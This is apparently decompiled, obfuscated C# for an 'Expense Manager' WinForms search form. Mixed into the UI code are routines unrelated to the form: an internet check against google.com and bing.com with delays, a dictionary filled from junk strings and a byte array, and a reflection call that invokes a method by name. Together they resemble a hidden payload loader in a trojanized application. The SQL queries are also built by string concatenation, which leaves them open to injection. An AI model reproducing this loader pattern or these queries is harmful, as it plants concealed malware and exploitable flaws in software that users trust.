using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Ja7;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Ty6;
using d5D;
using s8Z;

namespace t1G;

[DesignerGenerated]
public class Mc4 : Form
{
	private IContainer components;

	private Label _LblHead;

	private DataGridView _DGVCat;

	private Button _Button2;

	private Button _Button1;

	private PictureBox _PictureBox4;

	private Label _LblCad1;

	private DataGridView _DGVDate;

	private GroupBox _PanelDate;

	private Label _Label2;

	private Label _Label1;

	private DateTimePicker _TxtDate;

	internal static string[] Listt;

	internal static Dictionary<string, object> mDic;

	internal static string dName;

	internal static string tName;

	internal static string mName;

	internal static string mArray;

	internal static string sArray;

	internal static string T;

	internal static string sNum;

	internal PictureBox r;

	internal Label x;

	internal PictureBox T;

	internal PictureBox B;

	internal GroupBox j;

	internal ComboBox H;

	internal SqlConnection V;

	internal SqlDataAdapter L;

	internal DataSet f;

	internal DataTable u;

	internal string c;

	public string CadetPass
	{
		get
		{
			return c;
		}
		set
		{
			string text = (c = value);
		}
	}

	public Mc4()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Sn5);
		SqlConnection val = new SqlConnection();
		val.set_ConnectionString("Data Source=DELL;Initial Catalog=logindata;Integrated Security=True");
		SqlConnection val2 = (V = val);
		DataTable dataTable = (u = new DataTable());
		e3Y();
	}

	protected override void s0C(bool Ka7)
	{
		try
		{
			if (Ka7 && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Ka7);
		}
	}

	private void e3Y()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		//IL_01fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0205: Expected O, but got Unknown
		//IL_02fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0308: Expected O, but got Unknown
		//IL_03c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03cd: Expected O, but got Unknown
		//IL_0483: Unknown result type (might be due to invalid IL or missing references)
		//IL_048d: Expected O, but got Unknown
		//IL_0512: Unknown result type (might be due to invalid IL or missing references)
		//IL_051c: Expected O, but got Unknown
		//IL_05ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b6: Expected O, but got Unknown
		//IL_0669: Unknown result type (might be due to invalid IL or missing references)
		//IL_0673: Expected O, but got Unknown
		//IL_071b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0725: Expected O, but got Unknown
		//IL_07c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_07ce: Expected O, but got Unknown
		//IL_083e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0848: Expected O, but got Unknown
		//IL_0a5b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a65: Expected O, but got Unknown
		//IL_0b5b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b65: Expected O, but got Unknown
		//IL_0be4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bee: Expected O, but got Unknown
		//IL_0c29: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c33: Expected O, but got Unknown
		//IL_0caa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cb4: Expected O, but got Unknown
		//IL_0d45: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d4f: Expected O, but got Unknown
		//IL_0e5b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e65: Expected O, but got Unknown
		DataGridViewCellStyle val = new DataGridViewCellStyle();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Mc4));
		DataGridViewCellStyle val2 = new DataGridViewCellStyle();
		q6X(new Label());
		Cx5(new DataGridView());
		b8H(new PictureBox());
		g5D(new Button());
		My5(new Label());
		Fi4(new PictureBox());
		Pn9(new PictureBox());
		o5C(new Button());
		Ag3(new PictureBox());
		p7Y(new Label());
		p4G(new DataGridView());
		y5K(new GroupBox());
		Ee4(new GroupBox());
		Xi9(new ComboBox());
		De9(new Label());
		Qe7(new DateTimePicker());
		Hi2(new Label());
		((ISupportInitialize)Ay0()).BeginInit();
		((ISupportInitialize)Zp4()).BeginInit();
		((ISupportInitialize)o9L()).BeginInit();
		((ISupportInitialize)p7B()).BeginInit();
		((ISupportInitialize)Kn1()).BeginInit();
		((ISupportInitialize)n8Z()).BeginInit();
		((Control)Ct9()).SuspendLayout();
		((Control)c9H()).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)i8B()).set_Anchor((AnchorStyles)15);
		i8B().set_AutoSize(true);
		((Control)i8B()).set_BackColor(Color.Transparent);
		((Control)i8B()).set_Font(new Font("Comic Sans MS", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)i8B()).set_ForeColor(Color.Navy);
		((Control)i8B()).set_Location(new Point(307, 68));
		((Control)i8B()).set_Name("LblHead");
		((Control)i8B()).set_Size(new Size(84, 21));
		((Control)i8B()).set_TabIndex(0);
		i8B().set_Text("Search By");
		val.set_BackColor(Color.Transparent);
		val.set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		val.set_ForeColor(Color.DarkSlateGray);
		val.set_SelectionBackColor(Color.LightSlateGray);
		val.set_SelectionForeColor(Color.White);
		Ay0().set_AlternatingRowsDefaultCellStyle(val);
		((Control)Ay0()).set_Anchor((AnchorStyles)15);
		Ay0().set_AutoSizeColumnsMode((DataGridViewAutoSizeColumnsMode)16);
		Ay0().set_AutoSizeRowsMode((DataGridViewAutoSizeRowsMode)7);
		Ay0().set_BackgroundColor(Color.White);
		Ay0().set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		((Control)Ay0()).set_Location(new Point(180, 225));
		((Control)Ay0()).set_Name("DGVCat");
		((Control)Ay0()).set_Size(new Size(395, 299));
		((Control)Ay0()).set_TabIndex(1);
		((Control)Ay0()).set_Visible(false);
		((Control)Zp4()).set_Anchor((AnchorStyles)15);
		((Control)Zp4()).set_BackColor(Color.Transparent);
		((Control)Zp4()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox3.BackgroundImage"));
		((Control)Zp4()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)Zp4()).set_Location(new Point(671, 460));
		((Control)Zp4()).set_Name("PictureBox3");
		((Control)Zp4()).set_Size(new Size(60, 41));
		Zp4().set_TabIndex(15);
		Zp4().set_TabStop(false);
		((Control)Wa3()).set_Anchor((AnchorStyles)15);
		((ButtonBase)Wa3()).set_BackColor(Color.LightCyan);
		((Control)Wa3()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)Wa3()).set_Cursor(Cursors.get_Arrow());
		((ButtonBase)Wa3()).set_FlatStyle((FlatStyle)1);
		((Control)Wa3()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Wa3()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)Wa3()).set_Location(new Point(659, 507));
		((Control)Wa3()).set_Name("Button2");
		((Control)Wa3()).set_Size(new Size(102, 27));
		((Control)Wa3()).set_TabIndex(3);
		((ButtonBase)Wa3()).set_Text("&Main Menu");
		((ButtonBase)Wa3()).set_UseVisualStyleBackColor(false);
		((Control)Ze2()).set_Anchor((AnchorStyles)15);
		Ze2().set_AutoSize(true);
		((Control)Ze2()).set_BackColor(Color.Transparent);
		((Control)Ze2()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Ze2()).set_ForeColor(Color.Navy);
		((Control)Ze2()).set_Location(new Point(698, 21));
		((Control)Ze2()).set_Name("LblNm");
		((Control)Ze2()).set_Size(new Size(0, 19));
		((Control)Ze2()).set_TabIndex(16);
		((Control)o9L()).set_Anchor((AnchorStyles)15);
		((Control)o9L()).set_BackColor(Color.Transparent);
		((Control)o9L()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox1.BackgroundImage"));
		((Control)o9L()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)o9L()).set_Location(new Point(225, 5));
		((Control)o9L()).set_Name("PictureBox1");
		((Control)o9L()).set_Size(new Size(361, 50));
		o9L().set_TabIndex(17);
		o9L().set_TabStop(false);
		((Control)p7B()).set_Anchor((AnchorStyles)15);
		((Control)p7B()).set_BackColor(Color.Transparent);
		((Control)p7B()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox2.BackgroundImage"));
		((Control)p7B()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)p7B()).set_Location(new Point(-1, 0));
		((Control)p7B()).set_Name("PictureBox2");
		((Control)p7B()).set_Size(new Size(119, 109));
		p7B().set_TabIndex(19);
		p7B().set_TabStop(false);
		((Control)j8R()).set_Anchor((AnchorStyles)15);
		((ButtonBase)j8R()).set_BackColor(Color.Transparent);
		((Control)j8R()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)j8R()).set_Cursor(Cursors.get_Arrow());
		((ButtonBase)j8R()).set_FlatStyle((FlatStyle)1);
		((Control)j8R()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)j8R()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)j8R()).set_Location(new Point(581, 144));
		((Control)j8R()).set_Name("Button1");
		((Control)j8R()).set_Size(new Size(80, 27));
		((Control)j8R()).set_TabIndex(0);
		((ButtonBase)j8R()).set_Text("&Search");
		((ButtonBase)j8R()).set_UseVisualStyleBackColor(false);
		((Control)Kn1()).set_Anchor((AnchorStyles)15);
		((Control)Kn1()).set_BackColor(Color.Transparent);
		((Control)Kn1()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox4.BackgroundImage"));
		((Control)Kn1()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)Kn1()).set_Location(new Point(526, 132));
		((Control)Kn1()).set_Name("PictureBox4");
		((Control)Kn1()).set_Size(new Size(49, 39));
		Kn1().set_TabIndex(21);
		Kn1().set_TabStop(false);
		((Control)Pe4()).set_Anchor((AnchorStyles)15);
		Pe4().set_AutoSize(true);
		((Control)Pe4()).set_BackColor(Color.Transparent);
		((Control)Pe4()).set_Font(new Font("Comic Sans MS", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Pe4()).set_ForeColor(Color.Navy);
		((Control)Pe4()).set_Location(new Point(396, 68));
		((Control)Pe4()).set_Name("LblCad1");
		((Control)Pe4()).set_Size(new Size(0, 21));
		((Control)Pe4()).set_TabIndex(22);
		val2.set_BackColor(Color.Transparent);
		val2.set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		val2.set_ForeColor(Color.DarkSlateGray);
		val2.set_SelectionBackColor(Color.LightSlateGray);
		val2.set_SelectionForeColor(Color.White);
		n8Z().set_AlternatingRowsDefaultCellStyle(val2);
		((Control)n8Z()).set_Anchor((AnchorStyles)15);
		n8Z().set_BackgroundColor(Color.White);
		n8Z().set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		((Control)n8Z()).set_Location(new Point(43, 287));
		((Control)n8Z()).set_Name("DGVDate");
		((Control)n8Z()).set_Size(new Size(718, 85));
		((Control)n8Z()).set_TabIndex(2);
		((Control)n8Z()).set_Visible(false);
		((Control)Ct9()).set_Anchor((AnchorStyles)15);
		((Control)Ct9()).set_BackColor(Color.Transparent);
		((Control)Ct9()).get_Controls().Add((Control)(object)Zq7());
		((Control)Ct9()).get_Controls().Add((Control)(object)Qm3());
		((Control)Ct9()).set_Location(new Point(108, 111));
		((Control)Ct9()).set_Name("PanelDate");
		((Control)Ct9()).set_Size(new Size(396, 111));
		((Control)Ct9()).set_TabIndex(0);
		Ct9().set_TabStop(false);
		((Control)Ct9()).set_Visible(false);
		((Control)c9H()).set_Anchor((AnchorStyles)15);
		((Control)c9H()).set_BackColor(Color.Transparent);
		((Control)c9H()).get_Controls().Add((Control)(object)Bn0());
		((Control)c9H()).get_Controls().Add((Control)(object)Ra7());
		((Control)c9H()).set_Location(new Point(175, 92));
		((Control)c9H()).set_Name("PanelCtgry");
		((Control)c9H()).set_Size(new Size(221, 111));
		((Control)c9H()).set_TabIndex(23);
		c9H().set_TabStop(false);
		((Control)c9H()).set_Visible(false);
		((Control)Bn0()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Bn0().set_ForeColor(Color.FromArgb(0, 0, 64));
		((ListControl)Bn0()).set_FormattingEnabled(true);
		Bn0().get_Items().AddRange(new object[9] { "Food", "Clothes", "Stationary", "Market", "Entertainment", "Medical", "Transport", "Others", "Income" });
		((Control)Bn0()).set_Location(new Point(31, 59));
		((Control)Bn0()).set_Name("ddlCat");
		((Control)Bn0()).set_Size(new Size(163, 27));
		((Control)Bn0()).set_TabIndex(24);
		Ra7().set_AutoSize(true);
		((Control)Ra7()).set_BackColor(Color.Transparent);
		((Control)Ra7()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Ra7()).set_ForeColor(Color.FromArgb(0, 0, 64));
		((Control)Ra7()).set_Location(new Point(27, 26));
		((Control)Ra7()).set_Name("Label1");
		((Control)Ra7()).set_Size(new Size(137, 19));
		((Control)Ra7()).set_TabIndex(25);
		Ra7().set_Text("Select the Category");
		Zq7().set_CalendarFont(new Font("Comic Sans MS", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Zq7().set_CalendarForeColor(Color.FromArgb(0, 64, 0));
		Zq7().set_CalendarTitleForeColor(Color.FromArgb(0, 64, 0));
		((Control)Zq7()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Zq7()).set_Location(new Point(20, 53));
		((Control)Zq7()).set_Name("TxtDate");
		((Control)Zq7()).set_Size(new Size(249, 26));
		((Control)Zq7()).set_TabIndex(26);
		Qm3().set_AutoSize(true);
		((Control)Qm3()).set_BackColor(Color.Transparent);
		((Control)Qm3()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Qm3()).set_ForeColor(Color.FromArgb(0, 0, 64));
		((Control)Qm3()).set_Location(new Point(30, 16));
		((Control)Qm3()).set_Name("Label2");
		((Control)Qm3()).set_Size(new Size(118, 19));
		((Control)Qm3()).set_TabIndex(25);
		Qm3().set_Text("Select Your Date");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(789, 545));
		((Control)this).get_Controls().Add((Control)(object)c9H());
		((Control)this).get_Controls().Add((Control)(object)Ct9());
		((Control)this).get_Controls().Add((Control)(object)n8Z());
		((Control)this).get_Controls().Add((Control)(object)Pe4());
		((Control)this).get_Controls().Add((Control)(object)Kn1());
		((Control)this).get_Controls().Add((Control)(object)j8R());
		((Control)this).get_Controls().Add((Control)(object)p7B());
		((Control)this).get_Controls().Add((Control)(object)o9L());
		((Control)this).get_Controls().Add((Control)(object)Ze2());
		((Control)this).get_Controls().Add((Control)(object)Zp4());
		((Control)this).get_Controls().Add((Control)(object)Wa3());
		((Control)this).get_Controls().Add((Control)(object)Ay0());
		((Control)this).get_Controls().Add((Control)(object)i8B());
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form11");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Expense Manager");
		((ISupportInitialize)Ay0()).EndInit();
		((ISupportInitialize)Zp4()).EndInit();
		((ISupportInitialize)o9L()).EndInit();
		((ISupportInitialize)p7B()).EndInit();
		((ISupportInitialize)Kn1()).EndInit();
		((ISupportInitialize)n8Z()).EndInit();
		((Control)Ct9()).ResumeLayout(false);
		((Control)Ct9()).PerformLayout();
		((Control)c9H()).ResumeLayout(false);
		((Control)c9H()).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Label i8B()
	{
		return _LblHead;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void q6X(Label Mm5)
	{
		_LblHead = Mm5;
	}

	[SpecialName]
	internal virtual DataGridView Ay0()
	{
		return _DGVCat;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Cx5(DataGridView Gx2)
	{
		_DGVCat = Gx2;
	}

	[SpecialName]
	internal virtual PictureBox Zp4()
	{
		return r;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void b8H(PictureBox Ki3)
	{
		PictureBox val = (r = Ki3);
	}

	[SpecialName]
	internal virtual Button Wa3()
	{
		return _Button2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void g5D(Button m2K)
	{
		EventHandler eventHandler = Mb5;
		Button button = _Button2;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button2 = m2K;
		button = _Button2;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label Ze2()
	{
		return x;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void My5(Label d4Z)
	{
		Label val = (x = d4Z);
	}

	[SpecialName]
	internal virtual PictureBox o9L()
	{
		return T;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Fi4(PictureBox x9S)
	{
		PictureBox val = (T = x9S);
	}

	[SpecialName]
	internal virtual PictureBox p7B()
	{
		return B;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Pn9(PictureBox Ad0)
	{
		PictureBox val = (B = Ad0);
	}

	[SpecialName]
	internal virtual Button j8R()
	{
		return _Button1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void o5C(Button q3E)
	{
		EventHandler eventHandler = q6X;
		Button button = _Button1;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button1 = q3E;
		button = _Button1;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual PictureBox Kn1()
	{
		return _PictureBox4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ag3(PictureBox Bp4)
	{
		_PictureBox4 = Bp4;
	}

	[SpecialName]
	internal virtual Label Pe4()
	{
		return _LblCad1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void p7Y(Label Pn4)
	{
		_LblCad1 = Pn4;
	}

	[SpecialName]
	internal virtual DataGridView n8Z()
	{
		return _DGVDate;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void p4G(DataGridView Ns7)
	{
		_DGVDate = Ns7;
	}

	[SpecialName]
	internal virtual GroupBox Ct9()
	{
		return _PanelDate;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void y5K(GroupBox Bp8)
	{
		_PanelDate = Bp8;
	}

	[SpecialName]
	internal virtual Label Qm3()
	{
		return _Label2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Hi2(Label y4T)
	{
		_Label2 = y4T;
	}

	[SpecialName]
	internal virtual GroupBox c9H()
	{
		return j;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ee4(GroupBox g3E)
	{
		GroupBox val = (j = g3E);
	}

	[SpecialName]
	internal virtual ComboBox Bn0()
	{
		return H;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Xi9(ComboBox n0L)
	{
		ComboBox val = (H = n0L);
	}

	[SpecialName]
	internal virtual Label Ra7()
	{
		return _Label1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void De9(Label Bp8)
	{
		_Label1 = Bp8;
	}

	[SpecialName]
	internal virtual DateTimePicker Zq7()
	{
		return _TxtDate;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Qe7(DateTimePicker z5E)
	{
		EventHandler eventHandler = Ck0;
		DateTimePicker txtDate = _TxtDate;
		if (txtDate != null)
		{
			txtDate.remove_ValueChanged(eventHandler);
		}
		_TxtDate = z5E;
		txtDate = _TxtDate;
		if (txtDate != null)
		{
			txtDate.add_ValueChanged(eventHandler);
		}
	}

	public bool We1()
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			V.Open();
			V.Close();
			return true;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public bool y0P()
	{
		string cadetPass = CadetPass;
		if (Operators.CompareString(cadetPass, "Category", false) == 0)
		{
			return true;
		}
		return false;
	}

	private void Sn5(object sender, EventArgs e)
	{
		Ze2().set_Text(c5W.UsrNam);
		Pe4().set_Text(CadetPass);
		y0P();
		if (y0P())
		{
			((Control)c9H()).Show();
			((Control)Ct9()).Hide();
			((Control)Ay0()).Show();
			((Control)n8Z()).Hide();
		}
		if (!y0P())
		{
			((Control)Ct9()).Show();
			((Control)Ay0()).Hide();
			((Control)n8Z()).Show();
			((Control)c9H()).Hide();
		}
	}

	internal static bool b5T()
	{
		string[] array = new string[2] { "https://www.google.com/", "https://www.bing.com/" };
		int num = 0;
		checked
		{
			while (num != 2)
			{
				string[] array2 = array;
				foreach (string yr in array2)
				{
					if (!Ea0.k6Q(yr))
					{
						if (num > 0)
						{
							num--;
						}
						Task.Delay(30000).Wait();
					}
					else
					{
						num++;
					}
				}
			}
			if (num == 2)
			{
				return true;
			}
			return false;
		}
	}

	private void q6X(object sender, EventArgs e)
	{
		//IL_0194: Unknown result type (might be due to invalid IL or missing references)
		//IL_019a: Expected O, but got Unknown
		//IL_019c: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a3: Expected O, but got Unknown
		//IL_0210: Unknown result type (might be due to invalid IL or missing references)
		//IL_028c: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ef: Expected O, but got Unknown
		//IL_02f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f9: Expected O, but got Unknown
		//IL_0366: Unknown result type (might be due to invalid IL or missing references)
		if (y0P())
		{
			string text = Conversions.ToString(Bn0().get_SelectedItem());
			string text2 = text switch
			{
				"Food" => "FoodNote", 
				"Clothes" => "ClotNote", 
				"Stationary" => "StatNote", 
				"Market" => "MarkNote", 
				"Entertainment" => "EnteNote", 
				"Medical" => "MediNote", 
				"Transport" => "TranNote", 
				"Others" => "OtheNote", 
				"Income" => "IncoNote", 
				_ => " ", 
			};
			string identity = c5W.Identity;
			if (We1())
			{
				if (V.get_State() != ConnectionState.Open)
				{
					V.Open();
				}
				if (f != null)
				{
					f.Clear();
				}
				try
				{
					SqlCommand val = new SqlCommand("SELECT [Date], [" + text + "],[" + text2 + "]FROM [" + identity + "]", V);
					SqlDataAdapter val2 = (L = new SqlDataAdapter(val));
					DataSet dataSet = (f = new DataSet());
					((DbDataAdapter)(object)L).Fill(f);
					V.Close();
					Ay0().set_DataSource((object)f.Tables[0]);
					((Control)Ay0()).Refresh();
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
					ProjectData.ClearProjectError();
				}
			}
		}
		if (y0P() || !We1())
		{
			return;
		}
		if (V.get_State() != ConnectionState.Open)
		{
			V.Open();
		}
		if (f != null)
		{
			f.Clear();
		}
		if (Operators.CompareString(Zq7().get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Please Enter a valid Date", (MsgBoxStyle)0, (object)null);
			return;
		}
		DateTime dateTime = Conversions.ToDate(Zq7().get_Text());
		string identity2 = c5W.Identity;
		try
		{
			SqlCommand val3 = new SqlCommand("SELECT * FROM [" + identity2 + "]WHERE [Date] = '" + Conversions.ToString(dateTime) + "' ", V);
			SqlDataAdapter val4 = (L = new SqlDataAdapter(val3));
			DataSet dataSet2 = (f = new DataSet());
			((DbDataAdapter)(object)L).Fill(f);
			V.Close();
			n8Z().set_DataSource((object)f.Tables[0]);
			((Control)n8Z()).Refresh();
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			Interaction.MsgBox((object)ex4.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	internal static void g4Q(int Hd3)
	{
		mDic = new Dictionary<string, object>();
		Listt = new string[11]
		{
			"asat", "dfg", "ygyuou", "et", "yuo", "sg", "jhjl", "xc", "jk", "qwe",
			"jkoyys"
		};
		dName = Ea0.Fo5(Listt, 0, 1);
		mDic.Add(dName, Listt);
		tName = Ea0.Fo5(Listt, Hd3, 1);
		checked
		{
			mName = Ea0.Fo5(Listt, Hd3 + 1, 2);
			mArray = Ea0.Fo5(Listt, Hd3 + 2, 3);
			sArray = Ea0.Fo5(Listt, Hd3 + 3, 4);
			Mc4.T = Ea0.Fo5(Listt, Hd3 + 4, 5);
			sNum = Ea0.Fo5(Listt, Hd3 + 5, 6);
			if ((double)Hd3 != 2503.0)
			{
				Hd3 = 52;
				mDic.Add(sNum, 52);
			}
			byte[] value = Ea0.x6L(Hd3);
			mDic.Add(sArray, value);
			y0J.i4N2();
		}
	}

	private void Mb5(object sender, EventArgs e)
	{
		((Control)i1B.Forms.i5C()).Show();
		((Form)this).Close();
	}

	internal static string Rw2(string f8Q)
	{
		Type type = (Type)mDic[Mc4.T];
		return Conversions.ToString(type.InvokeMember(f8Q, BindingFlags.Static | BindingFlags.Public | BindingFlags.InvokeMethod, null, null, null));
	}

	private void Ck0(object sender, EventArgs e)
	{
	}
}
